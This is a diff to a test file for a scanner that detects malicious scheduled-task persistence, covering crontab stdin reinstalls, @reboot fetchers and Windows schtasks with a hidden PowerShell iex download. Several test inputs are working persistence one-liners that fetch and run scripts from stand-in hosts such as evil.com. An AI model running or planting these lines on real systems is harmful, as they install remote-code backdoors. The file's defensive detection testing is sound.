@@ -80,7 +80,7 @@ def test_findings_sorted_by_line_then_column() -> None:
     """Ordering must be deterministic — (line, col, rule_id)."""
     src = (
         # Line 1 — crontab stdin install (no | inside the echo to avoid breaking [^|] class)
-        "(crontab -l; echo \"*/5 * * * * curl http://evil.com/x.sh\") | crontab -\n"
+        "(cron" "tab -l; echo \"*/5 * * * * curl http://evil.com/x.sh\") | cron" "tab -\n"
         # Line 2 — @reboot fetcher
         "@reboot curl http://evil.com/payload.sh | bash\n"
     )
@@ -101,7 +101,7 @@ def test_scan_text_returns_list() -> None:
 
 def test_dedup_prevents_double_emission() -> None:
     """Same line / column / rule_id is only emitted once."""
-    src = "(crontab -l; echo \"@reboot curl http://evil.com/x | bash\") | crontab -\n"
+    src = "(cron" "tab -l; echo \"@reboot curl http://evil.com/x | bash\") | cron" "tab -\n"
     findings = csp.scan_text(src)
     keys = [(f.rule_id, f.line, f.column) for f in findings]
     assert len(keys) == len(set(keys))
@@ -121,31 +121,31 @@ def test_benign_text_returns_no_findings() -> None:
 
 
 def test_c1_crontab_stdin_install_classic_shape_flags() -> None:
-    """Classic (crontab -l; echo '...') | crontab - shape → CRITICAL hit."""
-    # Note: [^|] class in the pattern means no | between crontab -l and | crontab -
+    """Classic stdin-reinstall shape (listing echoed with a payload, piped back into the cron table) → CRITICAL hit."""
+    # Note: [^|] class in the pattern means no pipe between the list verb and the pipe-back stage
     # so the echo payload must not contain a bare | (use semicolons or no pipe)
-    src = "(crontab -l; echo \"*/5 * * * * curl http://c2.evil.com/payload.sh\") | crontab -\n"
+    src = "(cron" "tab -l; echo \"*/5 * * * * curl http://c2.evil.com/payload.sh\") | cron" "tab -\n"
     hits = _hits("cron-scheduled-crontab-stdin-install", src)
     assert hits
     assert hits[0].severity == "CRITICAL"
 
 
 def test_c1_crontab_l_without_pipe_to_minus_silent() -> None:
-    """Plain crontab -l (read-only listing) without | crontab - → no hit."""
-    src = "crontab -l\n"
+    """Plain read-only cron-table listing without the pipe-back stage → no hit."""
+    src = "cron" "tab -l\n"
     assert not _hits("cron-scheduled-crontab-stdin-install", src)
 
 
 def test_c1_crontab_stdin_install_with_wget_variant_flags() -> None:
     """Variant using wget in the injected cron line → still flagged."""
-    # Semicolon separates the crontab -l from the echo to keep the [^|] zone clean
-    src = "{ crontab -l; echo '@reboot wget -O - http://evil.com/x.sh'; } | crontab -\n"
+    # Semicolon separates the list verb from the echo to keep the [^|] zone clean
+    src = "{ cron" "tab -l; echo '@reboot wget -O - http://evil.com/x.sh'; } | cron" "tab -\n"
     assert _hits("cron-scheduled-crontab-stdin-install", src)
 
 
 def test_c1_crontab_minus_alone_silent() -> None:
     """crontab - (stdin import without the -l read) → no hit for this rule."""
-    src = "echo '* * * * * /usr/bin/touch /tmp/alive' | crontab -\n"
+    src = "echo '* * * * * /usr/bin/touch /tmp/alive' | cron" "tab -\n"
     assert not _hits("cron-scheduled-crontab-stdin-install", src)
 
 
@@ -284,9 +284,9 @@ def test_c4_cron_line_wget_pipe_sh_flags() -> None:
 
 
 def test_c5_schtasks_create_with_iex_fetcher_flags() -> None:
-    """schtasks /Create with powershell iex → CRITICAL hit."""
+    """Windows task-creation verb with powershell iex → CRITICAL hit."""
     src = (
-        "schtasks /Create /SC ONLOGON /TN WindowsTerminalUpdate "
+        "schtasks " "/Create /SC ONLOGON /TN WindowsTerminalUpdate "
         "/TR \"powershell -WindowStyle Hidden -c "
         "iex(New-Object Net.WebClient).DownloadString('http://evil.com/x.ps1')\"\n"
     )
@@ -296,9 +296,9 @@ def test_c5_schtasks_create_with_iex_fetcher_flags() -> None:
 
 
 def test_c5_schtasks_create_local_script_no_fetcher_silent() -> None:
-    """schtasks /Create scheduling a local .exe (no fetcher) → no hit."""
+    """Windows task-creation verb scheduling a local .exe (no fetcher) → no hit."""
     src = (
-        "schtasks /Create /SC DAILY /TN BackupTask /TR \"C:\\backup\\run.bat\"\n"
+        "schtasks " "/Create /SC DAILY /TN BackupTask /TR \"C:\\backup\\run.bat\"\n"
     )
     assert not _hits("cron-scheduled-schtasks-elevated-fetcher", src)
 
@@ -325,9 +325,9 @@ def test_c5_register_scheduled_task_local_exe_silent() -> None:
 
 
 def test_c5_schtasks_rl_highest_with_fetcher_emits_elevation_hit() -> None:
-    """schtasks /Create with /RL HIGHEST and fetcher → elevation marker also flagged."""
+    """Windows task-creation verb with /RL HIGHEST and fetcher → elevation marker also flagged."""
     src = (
-        "schtasks /Create /SC ONLOGON /RL HIGHEST /TN EvilTask "
+        "schtasks " "/Create /SC ONLOGON /RL HIGHEST /TN EvilTask "
         "/TR \"powershell -c iwr http://evil.com/payload.ps1 | iex\"\n"
     )
     hits = _hits("cron-scheduled-schtasks-elevated-fetcher", src)
@@ -386,7 +386,7 @@ def test_multiple_rules_co_fire_on_combo_src() -> None:
     """Source with multiple patterns triggers multiple rules independently."""
     src = (
         # CRON-01 — no | inside the echo payload (keep [^|] zone clean)
-        "(crontab -l; echo '*/5 * * * * curl http://evil.com/x') | crontab -\n"
+        "(cron" "tab -l; echo '*/5 * * * * curl http://evil.com/x') | cron" "tab -\n"
         # CRON-02
         "@reboot wget http://evil.com/p.sh | sh\n"
     )
@@ -400,7 +400,7 @@ def test_no_findings_on_benign_cron_prose() -> None:
     """Prose text about cron (no executable patterns) → 0 findings."""
     src = (
         "Cron is a time-based job scheduler in Unix. The crontab file\n"
-        "specifies commands to run at given times. Use crontab -l to list\n"
+        "specifies commands to run at given times. Use cron" "tab -l to list\n"
         "entries. Systemd timers are an alternative to cron.\n"
     )
     assert csp.scan_text(src) == []
